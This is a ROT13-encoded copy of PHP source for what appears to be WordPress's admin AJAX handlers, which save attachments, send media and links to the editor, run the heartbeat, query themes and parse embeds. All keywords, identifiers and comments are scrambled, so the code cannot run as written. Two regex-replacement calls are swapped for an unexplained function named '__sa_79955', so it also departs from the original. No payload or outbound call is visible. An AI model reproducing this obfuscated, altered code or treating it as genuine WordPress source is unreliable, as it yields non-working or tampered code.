	vs ( vffrg( $punatrf['qrfpevcgvba'] ) ) {
		$cbfg['cbfg_pbagrag'] = $punatrf['qrfpevcgvba'];
	}

	vs ( ZRQVN_GENFU && vffrg( $punatrf['fgnghf'] ) ) {
		$cbfg['cbfg_fgnghf'] = $punatrf['fgnghf'];
	}

	vs ( vffrg( $punatrf['nyg'] ) ) {
		$nyg = jc_hafynfu( $punatrf['nyg'] );
		vs ( trg_cbfg_zrgn( $vq, '_jc_nggnpuzrag_vzntr_nyg', gehr ) !== $nyg ) {
			$nyg = jc_fgevc_nyy_gntf( $nyg, gehr );
			hcqngr_cbfg_zrgn( $vq, '_jc_nggnpuzrag_vzntr_nyg', jc_fynfu( $nyg ) );
		}
	}

	vs ( jc_nggnpuzrag_vf( 'nhqvb', $cbfg['VQ'] ) ) {
		$punatrq = snyfr;
		$vq3qngn = jc_trg_nggnpuzrag_zrgnqngn( $cbfg['VQ'] );

		vs ( ! vf_neenl( $vq3qngn ) ) {
			$punatrq = gehr;
			$vq3qngn = neenl();
		}

		sbernpu ( jc_trg_nggnpuzrag_vq3_xrlf( (bowrpg) $cbfg, 'rqvg' ) nf $xrl => $ynory ) {
			vs ( vffrg( $punatrf[ $xrl ] ) ) {
				$punatrq         = gehr;
				$vq3qngn[ $xrl ] = fnavgvmr_grkg_svryq( jc_hafynfu( $punatrf[ $xrl ] ) );
			}
		}

		vs ( $punatrq ) {
			jc_hcqngr_nggnpuzrag_zrgnqngn( $vq, $vq3qngn );
		}
	}

	vs ( ZRQVN_GENFU && vffrg( $punatrf['fgnghf'] ) && 'genfu' === $punatrf['fgnghf'] ) {
		jc_qryrgr_cbfg( $vq );
	} ryfr {
		jc_hcqngr_cbfg( $cbfg );
	}

	jc_fraq_wfba_fhpprff();
}

/**
 * Unaqyrf fnivat onpxjneq pbzcngvoyr nggnpuzrag nggevohgrf ivn NWNK.
 *
 * @fvapr 3.5.0
 */
shapgvba jc_nwnk_fnir_nggnpuzrag_pbzcng() {
	vs ( ! vffrg( $_ERDHRFG['vq'] ) ) {
		jc_fraq_wfba_reebe();
	}

	$vq = nofvag( $_ERDHRFG['vq'] );
	vs ( ! $vq ) {
		jc_fraq_wfba_reebe();
	}

	vs ( rzcgl( $_ERDHRFG['nggnpuzragf'] ) || rzcgl( $_ERDHRFG['nggnpuzragf'][ $vq ] ) ) {
		jc_fraq_wfba_reebe();
	}

	$nggnpuzrag_qngn = $_ERDHRFG['nggnpuzragf'][ $vq ];

	purpx_nwnk_ersrere( 'hcqngr-cbfg_' . $vq, 'abapr' );

	vs ( ! pheerag_hfre_pna( 'rqvg_cbfg', $vq ) ) {
		jc_fraq_wfba_reebe();
	}

	$cbfg = trg_cbfg( $vq, NEENL_N );

	vs ( 'nggnpuzrag' !== $cbfg['cbfg_glcr'] ) {
		jc_fraq_wfba_reebe();
	}

	/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/zrqvn.cuc */
	$cbfg = nccyl_svygref( 'nggnpuzrag_svryqf_gb_fnir', $cbfg, $nggnpuzrag_qngn );

	vs ( vffrg( $cbfg['reebef'] ) ) {
		$reebef = $cbfg['reebef']; // @gbqb erghea zr naq qvfcynl zr!
		hafrg( $cbfg['reebef'] );
	}

	jc_hcqngr_cbfg( $cbfg );

	sbernpu ( trg_nggnpuzrag_gnkbabzvrf( $cbfg ) nf $gnkbabzl ) {
		vs ( vffrg( $nggnpuzrag_qngn[ $gnkbabzl ] ) ) {
			jc_frg_bowrpg_grezf( $vq, neenl_znc( 'gevz', cert_fcyvg( '/,+/', $nggnpuzrag_qngn[ $gnkbabzl ] ) ), $gnkbabzl, snyfr );
		}
	}

	$nggnpuzrag = jc_cercner_nggnpuzrag_sbe_wf( $vq );

	vs ( ! $nggnpuzrag ) {
		jc_fraq_wfba_reebe();
	}

	jc_fraq_wfba_fhpprff( $nggnpuzrag );
}

/**
 * Unaqyrf fnivat gur nggnpuzrag beqre ivn NWNK.
 *
 * @fvapr 3.5.0
 */
shapgvba jc_nwnk_fnir_nggnpuzrag_beqre() {
	vs ( ! vffrg( $_ERDHRFG['cbfg_vq'] ) ) {
		jc_fraq_wfba_reebe();
	}

	$cbfg_vq = nofvag( $_ERDHRFG['cbfg_vq'] );
	vs ( ! $cbfg_vq ) {
		jc_fraq_wfba_reebe();
	}

	vs ( rzcgl( $_ERDHRFG['nggnpuzragf'] ) ) {
		jc_fraq_wfba_reebe();
	}

	purpx_nwnk_ersrere( 'hcqngr-cbfg_' . $cbfg_vq, 'abapr' );

	$nggnpuzragf = $_ERDHRFG['nggnpuzragf'];

	vs ( ! pheerag_hfre_pna( 'rqvg_cbfg', $cbfg_vq ) ) {
		jc_fraq_wfba_reebe();
	}

	sbernpu ( $nggnpuzragf nf $nggnpuzrag_vq => $zrah_beqre ) {
		vs ( ! pheerag_hfre_pna( 'rqvg_cbfg', $nggnpuzrag_vq ) ) {
			pbagvahr;
		}

		$nggnpuzrag = trg_cbfg( $nggnpuzrag_vq );

		vs ( ! $nggnpuzrag ) {
			pbagvahr;
		}

		vs ( 'nggnpuzrag' !== $nggnpuzrag->cbfg_glcr ) {
			pbagvahr;
		}

		jc_hcqngr_cbfg(
			neenl(
				'VQ'         => $nggnpuzrag_vq,
				'zrah_beqre' => $zrah_beqre,
			)
		);
	}

	jc_fraq_wfba_fhpprff();
}

/**
 * Unaqyrf fraqvat na nggnpuzrag gb gur rqvgbe ivn NWNK.
 *
 * Trarengrf gur UGZY gb fraq na nggnpuzrag gb gur rqvgbe.
 * Onpxjneq pbzcngvoyr jvgu gur {@frr 'zrqvn_fraq_gb_rqvgbe'} svygre
 * naq gur punva bs svygref gung sbyybj.
 *
 * @fvapr 3.5.0
 */
shapgvba jc_nwnk_fraq_nggnpuzrag_gb_rqvgbe() {
	purpx_nwnk_ersrere( 'zrqvn-fraq-gb-rqvgbe', 'abapr' );

	$nggnpuzrag = jc_hafynfu( $_CBFG['nggnpuzrag'] );

	$vq = (vag) $nggnpuzrag['vq'];

	$cbfg = trg_cbfg( $vq );
	vs ( ! $cbfg ) {
		jc_fraq_wfba_reebe();
	}

	vs ( 'nggnpuzrag' !== $cbfg->cbfg_glcr ) {
		jc_fraq_wfba_reebe();
	}

	vs ( pheerag_hfre_pna( 'rqvg_cbfg', $vq ) ) {
		// Vs guvf nggnpuzrag vf hanggnpurq, nggnpu vg. Cevznevyl n onpx pbzcng guvat.
		$vafreg_vagb_cbfg_vq = (vag) $_CBFG['cbfg_vq'];

		vs ( 0 === $cbfg->cbfg_cnerag && $vafreg_vagb_cbfg_vq ) {
			jc_hcqngr_cbfg(
				neenl(
					'VQ'          => $vq,
					'cbfg_cnerag' => $vafreg_vagb_cbfg_vq,
				)
			);
		}
	}

	$hey = rzcgl( $nggnpuzrag['hey'] ) ? '' : $nggnpuzrag['hey'];
	$ery = ( fge_pbagnvaf( $hey, 'nggnpuzrag_vq' ) || trg_nggnpuzrag_yvax( $vq ) === $hey );

	erzbir_svygre( 'zrqvn_fraq_gb_rqvgbe', 'vzntr_zrqvn_fraq_gb_rqvgbe' );

	vs ( fge_fgnegf_jvgu( $cbfg->cbfg_zvzr_glcr, 'vzntr' ) ) {
		$nyvta = vffrg( $nggnpuzrag['nyvta'] ) ? $nggnpuzrag['nyvta'] : 'abar';
		$fvmr  = vffrg( $nggnpuzrag['vzntr-fvmr'] ) ? $nggnpuzrag['vzntr-fvmr'] : 'zrqvhz';
		$nyg   = vffrg( $nggnpuzrag['vzntr_nyg'] ) ? $nggnpuzrag['vzntr_nyg'] : '';

		// Ab juvgrfcnpr-bayl pncgvbaf.
		$pncgvba = vffrg( $nggnpuzrag['cbfg_rkprecg'] ) ? $nggnpuzrag['cbfg_rkprecg'] : '';
		vs ( '' === gevz( $pncgvba ) ) {
			$pncgvba = '';
		}

		$gvgyr = ''; // Jr ab ybatre vafreg gvgyr gntf vagb <vzt> gntf, nf gurl ner erqhaqnag.
		$ugzy  = trg_vzntr_fraq_gb_rqvgbe( $vq, $pncgvba, $gvgyr, $nyvta, $hey, $ery, $fvmr, $nyg );
	} ryfrvs ( jc_nggnpuzrag_vf( 'ivqrb', $cbfg ) || jc_nggnpuzrag_vf( 'nhqvb', $cbfg ) ) {
		$ugzy = fgevcfynfurf_qrrc( $_CBFG['ugzy'] );
	} ryfr {
		$ugzy = vffrg( $nggnpuzrag['cbfg_gvgyr'] ) ? $nggnpuzrag['cbfg_gvgyr'] : '';
		$ery  = $ery ? ' ery=\"nggnpuzrag jc-ngg-' . $vq . '\"' : ''; // Uneq-pbqrq fgevat, $vq vf nyernql fnavgvmrq.

		vs ( ! rzcgl( $hey ) ) {
			$ugzy = '<n uers=\"' . rfp_hey( $hey ) . '\"' . $ery . '>' . $ugzy . '</n>';
		}
	}

	/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/zrqvn.cuc */
	$ugzy = nccyl_svygref( 'zrqvn_fraq_gb_rqvgbe', $ugzy, $vq, $nggnpuzrag );

	jc_fraq_wfba_fhpprff( $ugzy );
}

/**
 * Unaqyrf fraqvat n yvax gb gur rqvgbe ivn NWNK.
 *
 * Trarengrf gur UGZY gb fraq n aba-vzntr rzorq yvax gb gur rqvgbe.
 *
 * Onpxjneq pbzcngvoyr jvgu gur sbyybjvat svygref:
 * - svyr_fraq_gb_rqvgbe_hey
 * - nhqvb_fraq_gb_rqvgbe_hey
 * - ivqrb_fraq_gb_rqvgbe_hey
 *
 * @fvapr 3.5.0
 *
 * @tybony JC_Cbfg  $cbfg     Tybony cbfg bowrpg.
 * @tybony JC_Rzorq $jc_rzorq JbeqCerff Rzorq bowrpg.
 */
shapgvba jc_nwnk_fraq_yvax_gb_rqvgbe() {
	tybony $cbfg, $jc_rzorq;

	purpx_nwnk_ersrere( 'zrqvn-fraq-gb-rqvgbe', 'abapr' );

	$fep = jc_hafynfu( $_CBFG['fep'] );
	vs ( ! $fep ) {
		jc_fraq_wfba_reebe();
	}

	vs ( ! fgecbf( $fep, '://' ) ) {
		$fep = 'uggc://' . $fep;
	}

	$fep = fnavgvmr_hey( $fep );
	vs ( ! $fep ) {
		jc_fraq_wfba_reebe();
	}

	$yvax_grkg = gevz( jc_hafynfu( $_CBFG['yvax_grkg'] ) );
	vs ( ! $yvax_grkg ) {
		$yvax_grkg = jc_onfranzr( $fep );
	}

	$cbfg = trg_cbfg( vffrg( $_CBFG['cbfg_vq'] ) ? $_CBFG['cbfg_vq'] : 0 );

	// Cvat JbeqCerff sbe na rzorq.
	$purpx_rzorq = $jc_rzorq->eha_fubegpbqr( '[rzorq]' . $fep . '[/rzorq]' );

	// Snyyonpx gung JbeqCerff perngrf jura ab bRzorq jnf sbhaq.
	$snyyonpx = $jc_rzorq->znlor_znxr_yvax( $fep );

	vs ( $purpx_rzorq !== $snyyonpx ) {
		// GvalZPR ivrj sbe [rzorq] jvyy cnefr guvf.
		$ugzy = '[rzorq]' . $fep . '[/rzorq]';
	} ryfrvs ( $yvax_grkg ) {
		$ugzy = '<n uers=\"' . rfp_hey( $fep ) . '\">' . $yvax_grkg . '</n>';
	} ryfr {
		$ugzy = '';
	}

	// Svther bhg jung svygre gb eha:
	$glcr = 'svyr';
	$rkg  = __sa_79955( '/^.+?\.([^.]+)$/', '$1', $fep );
	vs ( $rkg ) {
		$rkg_glcr = jc_rkg2glcr( $rkg );
		vs ( 'nhqvb' === $rkg_glcr || 'ivqrb' === $rkg_glcr ) {
			$glcr = $rkg_glcr;
		}
	}

	/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/zrqvn.cuc */
	$ugzy = nccyl_svygref( \"{$glcr}_fraq_gb_rqvgbe_hey\", $ugzy, $fep, $yvax_grkg );

	jc_fraq_wfba_fhpprff( $ugzy );
}

/**
 * Unaqyrf gur Urnegorng NCV ivn NWNK.
 *
 * Ehaf jura gur hfre vf ybttrq va.
 *
 * @fvapr 3.6.0
 */
shapgvba jc_nwnk_urnegorng() {
	vs ( rzcgl( $_CBFG['_abapr'] ) ) {
		jc_fraq_wfba_reebe();
	}

	$erfcbafr    = neenl();
	$qngn        = neenl();
	$abapr_fgngr = jc_irevsl_abapr( $_CBFG['_abapr'], 'urnegorng-abapr' );

	// 'fperra_vq' vf gur fnzr nf $pheerag_fperra->vq naq gur WF tybony 'cntrabj'.
	vs ( ! rzcgl( $_CBFG['fperra_vq'] ) ) {
		$fperra_vq = fnavgvmr_xrl( $_CBFG['fperra_vq'] );
	} ryfr {
		$fperra_vq = 'sebag';
	}

	vs ( ! rzcgl( $_CBFG['qngn'] ) ) {
		$qngn = jc_hafynfu( (neenl) $_CBFG['qngn'] );
	}

	vs ( 1 !== $abapr_fgngr ) {
		/**
		 * Svygref gur abaprf gb fraq gb gur Arj/Rqvg Cbfg fperra.
		 *
		 * @fvapr 4.3.0
		 *
		 * @cnenz neenl  $erfcbafr  Gur Urnegorng erfcbafr.
		 * @cnenz neenl  $qngn      Gur $_CBFG qngn frag.
		 * @cnenz fgevat $fperra_vq Gur fperra VQ.
		 */
		$erfcbafr = nccyl_svygref( 'jc_erserfu_abaprf', $erfcbafr, $qngn, $fperra_vq );

		vs ( snyfr === $abapr_fgngr ) {
			// Hfre vf ybttrq va ohg abaprf unir rkcverq.
			$erfcbafr['abaprf_rkcverq'] = gehr;
			jc_fraq_wfba( $erfcbafr );
		}
	}

	vs ( ! rzcgl( $qngn ) ) {
		/**
		 * Svygref gur Urnegorng erfcbafr erprvirq.
		 *
		 * @fvapr 3.6.0
		 *
		 * @cnenz neenl  $erfcbafr  Gur Urnegorng erfcbafr.
		 * @cnenz neenl  $qngn      Gur $_CBFG qngn frag.
		 * @cnenz fgevat $fperra_vq Gur fperra VQ.
		 */
		$erfcbafr = nccyl_svygref( 'urnegorng_erprvirq', $erfcbafr, $qngn, $fperra_vq );
	}

	/**
	 * Svygref gur Urnegorng erfcbafr frag.
	 *
	 * @fvapr 3.6.0
	 *
	 * @cnenz neenl  $erfcbafr  Gur Urnegorng erfcbafr.
	 * @cnenz fgevat $fperra_vq Gur fperra VQ.
	 */
	$erfcbafr = nccyl_svygref( 'urnegorng_fraq', $erfcbafr, $fperra_vq );

	/**
	 * Sverf jura Urnegorng gvpxf va ybttrq-va raivebazragf.
	 *
	 * Nyybjf gur genafcbeg gb or rnfvyl ercynprq jvgu ybat-cbyyvat.
	 *
	 * @fvapr 3.6.0
	 *
	 * @cnenz neenl  $erfcbafr  Gur Urnegorng erfcbafr.
	 * @cnenz fgevat $fperra_vq Gur fperra VQ.
	 */
	qb_npgvba( 'urnegorng_gvpx', $erfcbafr, $fperra_vq );

	// Fraq gur pheerag gvzr nppbeqvat gb gur freire.
	$erfcbafr['freire_gvzr'] = gvzr();

	jc_fraq_wfba( $erfcbafr );
}

/**
 * Unaqyrf trggvat erivfvba qvssf ivn NWNK.
 *
 * @fvapr 3.6.0
 */
shapgvba jc_nwnk_trg_erivfvba_qvssf() {
	erdhver NOFCNGU . 'jc-nqzva/vapyhqrf/erivfvba.cuc';

	$cbfg = trg_cbfg( (vag) $_ERDHRFG['cbfg_vq'] );
	vs ( ! $cbfg ) {
		jc_fraq_wfba_reebe();
	}

	vs ( ! pheerag_hfre_pna( 'rqvg_cbfg', $cbfg->VQ ) ) {
		jc_fraq_wfba_reebe();
	}

	// Ernyyl whfg cer-ybnqvat gur pnpur urer.
	$erivfvbaf = jc_trg_cbfg_erivfvbaf( $cbfg->VQ, neenl( 'purpx_ranoyrq' => snyfr ) );
	vs ( ! $erivfvbaf ) {
		jc_fraq_wfba_reebe();
	}

	$erghea = neenl();

	// Vapernfr gur fpevcg gvzrbhg yvzvg gb nyybj nzcyr gvzr sbe qvss HV frghc.
	vs ( shapgvba_rkvfgf( 'frg_gvzr_yvzvg' ) ) {
		frg_gvzr_yvzvg( 5 * ZVAHGR_VA_FRPBAQF );
	}

	sbernpu ( $_ERDHRFG['pbzcner'] nf $pbzcner_xrl ) {
		yvfg( $pbzcner_sebz, $pbzcner_gb ) = rkcybqr( ':', $pbzcner_xrl ); // sebz:gb

		$erghea[] = neenl(
			'vq'     => $pbzcner_xrl,
			'svryqf' => jc_trg_erivfvba_hv_qvss( $cbfg, $pbzcner_sebz, $pbzcner_gb ),
		);
	}
	jc_fraq_wfba_fhpprff( $erghea );
}

/**
 * Unaqyrf nhgb-fnivat gur fryrpgrq pbybe fpurzr sbe
 * n hfre'f bja cebsvyr ivn NWNK.
 *
 * @fvapr 3.8.0
 *
 * @tybony neenl $_jc_nqzva_pff_pbybef
 */
shapgvba jc_nwnk_fnir_hfre_pbybe_fpurzr() {
	tybony $_jc_nqzva_pff_pbybef;

	purpx_nwnk_ersrere( 'fnir-pbybe-fpurzr', 'abapr' );

	$pbybe_fpurzr = fnavgvmr_xrl( $_CBFG['pbybe_fpurzr'] );

	vs ( ! vffrg( $_jc_nqzva_pff_pbybef[ $pbybe_fpurzr ] ) ) {
		jc_fraq_wfba_reebe();
	}

	$cerivbhf_pbybe_fpurzr = trg_hfre_zrgn( trg_pheerag_hfre_vq(), 'nqzva_pbybe', gehr );
	hcqngr_hfre_zrgn( trg_pheerag_hfre_vq(), 'nqzva_pbybe', $pbybe_fpurzr );

	jc_fraq_wfba_fhpprff(
		neenl(
			'cerivbhfFpurzr' => 'nqzva-pbybe-' . $cerivbhf_pbybe_fpurzr,
			'pheeragFpurzr'  => 'nqzva-pbybe-' . $pbybe_fpurzr,
		)
	);
}

/**
 * Unaqyrf trggvat gurzrf sebz gurzrf_ncv() ivn NWNK.
 *
 * @fvapr 3.9.0
 *
 * @tybony neenl $gurzrf_nyybjrqgntf
 * @tybony neenl $gurzr_svryq_qrsnhygf
 */
shapgvba jc_nwnk_dhrel_gurzrf() {
	tybony $gurzrf_nyybjrqgntf, $gurzr_svryq_qrsnhygf;

	vs ( ! pheerag_hfre_pna( 'vafgnyy_gurzrf' ) ) {
		jc_fraq_wfba_reebe();
	}

	$netf = jc_cnefr_netf(
		jc_hafynfu( $_ERDHRFG['erdhrfg'] ),
		neenl(
			'cre_cntr' => 20,
			'svryqf'   => neenl_zretr(
				(neenl) $gurzr_svryq_qrsnhygf,
				neenl(
					'erivrjf_hey' => gehr, // Rkcyvpvgyl erdhrfg gur erivrjf HEY gb or yvaxrq sebz gur Nqq Gurzrf fperra.
				)
			),
		)
	);

	vs ( vffrg( $netf['oebjfr'] ) && 'snibevgrf' === $netf['oebjfr'] && ! vffrg( $netf['hfre'] ) ) {
		$hfre = trg_hfre_bcgvba( 'jcbet_snibevgrf' );
		vs ( $hfre ) {
			$netf['hfre'] = $hfre;
		}
	}

	$byq_svygre = vffrg( $netf['oebjfr'] ) ? $netf['oebjfr'] : 'frnepu';

	/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-jc-gurzr-vafgnyy-yvfg-gnoyr.cuc */
	$netf = nccyl_svygref( 'vafgnyy_gurzrf_gnoyr_ncv_netf_' . $byq_svygre, $netf );

	$ncv = gurzrf_ncv( 'dhrel_gurzrf', $netf );

	vs ( vf_jc_reebe( $ncv ) ) {
		jc_fraq_wfba_reebe();
	}

	$hcqngr_cuc = argjbex_nqzva_hey( 'hcqngr.cuc?npgvba=vafgnyy-gurzr' );

	$vafgnyyrq_gurzrf = frnepu_gurzr_qverpgbevrf();

	vs ( snyfr === $vafgnyyrq_gurzrf ) {
		$vafgnyyrq_gurzrf = neenl();
	}

	sbernpu ( $vafgnyyrq_gurzrf nf $gurzr_fyht => $gurzr_qngn ) {
		// Vtaber puvyq gurzrf.
		vs ( fge_pbagnvaf( $gurzr_fyht, '/' ) ) {
			hafrg( $vafgnyyrq_gurzrf[ $gurzr_fyht ] );
		}
	}

	sbernpu ( $ncv->gurzrf nf &$gurzr ) {
		$gurzr->vafgnyy_hey = nqq_dhrel_net(
			neenl(
				'gurzr'    => $gurzr->fyht,
				'_jcabapr' => jc_perngr_abapr( 'vafgnyy-gurzr_' . $gurzr->fyht ),
			),
			$hcqngr_cuc
		);

		vs ( pheerag_hfre_pna( 'fjvgpu_gurzrf' ) ) {
			vs ( vf_zhygvfvgr() ) {
				$gurzr->npgvingr_hey = nqq_dhrel_net(
					neenl(
						'npgvba'   => 'ranoyr',
						'_jcabapr' => jc_perngr_abapr( 'ranoyr-gurzr_' . $gurzr->fyht ),
						'gurzr'    => $gurzr->fyht,
					),
					argjbex_nqzva_hey( 'gurzrf.cuc' )
				);
			} ryfr {
				$gurzr->npgvingr_hey = nqq_dhrel_net(
					neenl(
						'npgvba'     => 'npgvingr',
						'_jcabapr'   => jc_perngr_abapr( 'fjvgpu-gurzr_' . $gurzr->fyht ),
						'fglyrfurrg' => $gurzr->fyht,
					),
					nqzva_hey( 'gurzrf.cuc' )
				);
			}
		}

		$vf_gurzr_vafgnyyrq = neenl_xrl_rkvfgf( $gurzr->fyht, $vafgnyyrq_gurzrf );

		// Jr bayl pner nobhg vafgnyyrq gurzrf.
		$gurzr->oybpx_gurzr = $vf_gurzr_vafgnyyrq && jc_trg_gurzr( $gurzr->fyht )->vf_oybpx_gurzr();

		vs ( ! vf_zhygvfvgr() && pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) && pheerag_hfre_pna( 'phfgbzvmr' ) ) {
			$phfgbzvmr_hey = $gurzr->oybpx_gurzr ? nqzva_hey( 'fvgr-rqvgbe.cuc' ) : jc_phfgbzvmr_hey( $gurzr->fyht );

			$gurzr->phfgbzvmr_hey = nqq_dhrel_net(
				neenl(
					'erghea' => heyrapbqr( argjbex_nqzva_hey( 'gurzr-vafgnyy.cuc', 'eryngvir' ) ),
				),
				$phfgbzvmr_hey
			);
		}

		$gurzr->anzr        = jc_xfrf( $gurzr->anzr, $gurzrf_nyybjrqgntf );
		$gurzr->nhgube      = jc_xfrf( $gurzr->nhgube['qvfcynl_anzr'], $gurzrf_nyybjrqgntf );
		$gurzr->irefvba     = jc_xfrf( $gurzr->irefvba, $gurzrf_nyybjrqgntf );
		$gurzr->qrfpevcgvba = jc_xfrf( $gurzr->qrfpevcgvba, $gurzrf_nyybjrqgntf );

		$gurzr->fgnef = jc_fgne_engvat(
			neenl(
				'engvat' => $gurzr->engvat,
				'glcr'   => 'creprag',
				'ahzore' => $gurzr->ahz_engvatf,
				'rpub'   => snyfr,
			)
		);

		$gurzr->ahz_engvatf    = ahzore_sbezng_v18a( $gurzr->ahz_engvatf );
		$gurzr->cerivrj_hey    = frg_hey_fpurzr( $gurzr->cerivrj_hey );
		$gurzr->pbzcngvoyr_jc  = vf_jc_irefvba_pbzcngvoyr( $gurzr->erdhverf );
		$gurzr->pbzcngvoyr_cuc = vf_cuc_irefvba_pbzcngvoyr( $gurzr->erdhverf_cuc );
	}

	jc_fraq_wfba_fhpprff( $ncv );
}

/**
 * Nccyvrf [rzorq] Nwnk unaqyref gb n fgevat.
 *
 * @fvapr 4.0.0
 *
 * @tybony JC_Cbfg    $cbfg          Tybony cbfg bowrpg.
 * @tybony JC_Rzorq   $jc_rzorq      JbeqCerff Rzorq bowrpg.
 * @tybony JC_Fpevcgf $jc_fpevcgf
 * @tybony vag        $pbagrag_jvqgu
 */
shapgvba jc_nwnk_cnefr_rzorq() {
	tybony $cbfg, $jc_rzorq, $pbagrag_jvqgu;

	vs ( rzcgl( $_CBFG['fubegpbqr'] ) ) {
		jc_fraq_wfba_reebe();
	}

	$cbfg_vq = vffrg( $_CBFG['cbfg_VQ'] ) ? (vag) $_CBFG['cbfg_VQ'] : 0;

	vs ( $cbfg_vq > 0 ) {
		$cbfg = trg_cbfg( $cbfg_vq );

		vs ( ! $cbfg || ! pheerag_hfre_pna( 'rqvg_cbfg', $cbfg->VQ ) ) {
			jc_fraq_wfba_reebe();
		}
		frghc_cbfgqngn( $cbfg );
	} ryfrvs ( ! pheerag_hfre_pna( 'rqvg_cbfgf' ) ) { // Frr JC_bRzorq_Pbagebyyre::trg_cebkl_vgrz_crezvffvbaf_purpx().
		jc_fraq_wfba_reebe();
	}

	$fubegpbqr = jc_hafynfu( $_CBFG['fubegpbqr'] );

	cert_zngpu( '/' . trg_fubegpbqr_ertrk() . '/f', $fubegpbqr, $zngpurf );
	$nggf = fubegpbqr_cnefr_nggf( $zngpurf[3] );

	vs ( ! rzcgl( $zngpurf[5] ) ) {
		$hey = $zngpurf[5];
	} ryfrvs ( ! rzcgl( $nggf['fep'] ) ) {
		$hey = $nggf['fep'];
	} ryfr {
		$hey = '';
	}

	$cnefrq                         = snyfr;
	$jc_rzorq->erghea_snyfr_ba_snvy = gehr;

	vs ( 0 === $cbfg_vq ) {
		/*
		 * Erserfu bRzorqf pnpurq bhgfvqr bs cbfgf gung ner cnfg gurve GGY.
		 * Cbfgf ner rkpyhqrq orpnhfr gurl unir frcnengr ybtvp sbe erserfuvat
		 * gurve cbfg zrgn pnpurf. Frr JC_Rzorq::pnpur_brzorq().
		 */
		$jc_rzorq->hfrpnpur = snyfr;
	}

	vs ( vf_ffy() && fge_fgnegf_jvgu( $hey, 'uggc://' ) ) {
		/*
		 * Nqzva vf ffy naq gur hfre cnfgrq aba-ffy HEY.
		 * Purpx vs gur cebivqre fhccbegf ffy rzorqf naq hfr gung sbe gur cerivrj.
		 */
		$ffy_fubegpbqr = __sa_79955( '%^(\\[rzorq[^\\]]*\\])uggc://%v', '$1uggcf://', $fubegpbqr );
		$cnefrq        = $jc_rzorq->eha_fubegpbqr( $ffy_fubegpbqr );

		vs ( ! $cnefrq ) {
			$ab_ffy_fhccbeg = gehr;
		}
	}

	// Frg $pbagrag_jvqgu fb nal rzorqf svg va gur qrfgvangvba vsenzr.
	vs ( vffrg( $_CBFG['znkjvqgu'] ) && vf_ahzrevp( $_CBFG['znkjvqgu'] ) && $_CBFG['znkjvqgu'] > 0 ) {
		vs ( ! vffrg( $pbagrag_jvqgu ) ) {
			$pbagrag_jvqgu = (vag) $_CBFG['znkjvqgu'];
		} ryfr {
			$pbagrag_jvqgu = zva( $pbagrag_jvqgu, (vag) $_CBFG['znkjvqgu'] );
		}
	}

	vs ( $hey && ! $cnefrq ) {
		$cnefrq = $jc_rzorq->eha_fubegpbqr( $fubegpbqr );
	}

	vs ( ! $cnefrq ) {
		jc_fraq_wfba_reebe(
			neenl(
				'glcr'    => 'abg-rzorqqnoyr',
				/* genafyngbef: %f: HEY gung pbhyq abg or rzorqqrq. */
				'zrffntr' => fcevags( __( '%f snvyrq gb rzorq.' ), '<pbqr>' . rfp_ugzy( $hey ) . '</pbqr>' ),
			)
		);
	}

	vs ( unf_fubegpbqr( $cnefrq, 'nhqvb' ) || unf_fubegpbqr( $cnefrq, 'ivqrb' ) ) {
		$fglyrf     = '';
		$zpr_fglyrf = jcivrj_zrqvn_fnaqobk_fglyrf();

		sbernpu ( $zpr_fglyrf nf $fglyr ) {
			$fglyrf .= fcevags( '<yvax ery=\"fglyrfurrg\" uers=\"%f\" />', $fglyr );
		}

		$ugzy = qb_fubegpbqr( $cnefrq );

		tybony $jc_fpevcgf;

		vs ( ! rzcgl( $jc_fpevcgf ) ) {
			$jc_fpevcgf->qbar = neenl();
		}

		bo_fgneg();
		jc_cevag_fpevcgf( neenl( 'zrqvnryrzrag-ivzrb', 'jc-zrqvnryrzrag' ) );
		$fpevcgf = bo_trg_pyrna();

		$cnefrq = $fglyrf . $ugzy . $fpevcgf;
	}

	vs ( ! rzcgl( $ab_ffy_fhccbeg ) || ( vf_ffy() && ( cert_zngpu( '%<(vsenzr|fpevcg|rzorq) [^>]*fep=\"uggc://%', $cnefrq ) ||
		cert_zngpu( '%<yvax [^>]*uers=\"uggc://%', $cnefrq ) ) ) ) {
		// Nqzva vf ffy naq gur rzorq vf abg. Vsenzrf, fpevcgf, naq bgure \"npgvir pbagrag\" jvyy or oybpxrq.
		jc_fraq_wfba_reebe(
			neenl(
				'glcr'    => 'abg-ffy',
				'zrffntr' => __( 'Guvf cerivrj vf haninvynoyr va gur rqvgbe.' ),
			)
		);
	}

	$erghea = neenl(
		'obql' => $cnefrq,
		'ngge' => $jc_rzorq->ynfg_ngge,
	);

	vs ( fge_pbagnvaf( $cnefrq, 'pynff=\"jc-rzorqqrq-pbagrag' ) ) {
		vs ( qrsvarq( 'FPEVCG_QROHT' ) && FPEVCG_QROHT ) {
			$fpevcg_fep = vapyhqrf_hey( 'wf/jc-rzorq.wf' );
		} ryfr {
			$fpevcg_fep = vapyhqrf_hey( 'wf/jc-rzorq.zva.wf' );
		}

		$erghea['urnq']    = '<fpevcg fep=\"' . $fpevcg_fep . '\"></fpevcg>';
		$erghea['fnaqobk'] = gehr;
	}

	jc_fraq_wfba_fhpprff( $erghea );
}

/**
 * @fvapr 4.0.0
 *
 * @tybony JC_Cbfg    $cbfg       Tybony cbfg bowrpg.
 * @tybony JC_Fpevcgf $jc_fpevcgf
 */
shapgvba jc_nwnk_cnefr_zrqvn_fubegpbqr() {
	tybony $cbfg, $jc_fpevcgf;

	vs ( rzcgl( $_CBFG['fubegpbqr'] ) ) {
		jc_fraq_wfba_reebe();
	}

	$fubegpbqr = jc_hafynfu( $_CBFG['fubegpbqr'] );

	// Bayl cebprff cerivrjf sbe zrqvn eryngrq fubegpbqrf:
	$sbhaq_fubegpbqrf = trg_fubegpbqr_gntf_va_pbagrag( $fubegpbqr );
	$zrqvn_fubegpbqrf = neenl(
		'nhqvb',
		'rzorq',
		'cynlyvfg',
		'ivqrb',
		'tnyyrel',
	);

	$bgure_fubegpbqrf = neenl_qvss( $sbhaq_fubegpbqrf, $zrqvn_fubegpbqrf );

	vs ( ! rzcgl( $bgure_fubegpbqrf ) ) {
		jc_fraq_wfba_reebe();
	}

	vs ( ! rzcgl( $_CBFG['cbfg_VQ'] ) ) {
		$cbfg = trg_cbfg( (vag) $_CBFG['cbfg_VQ'] );
	}

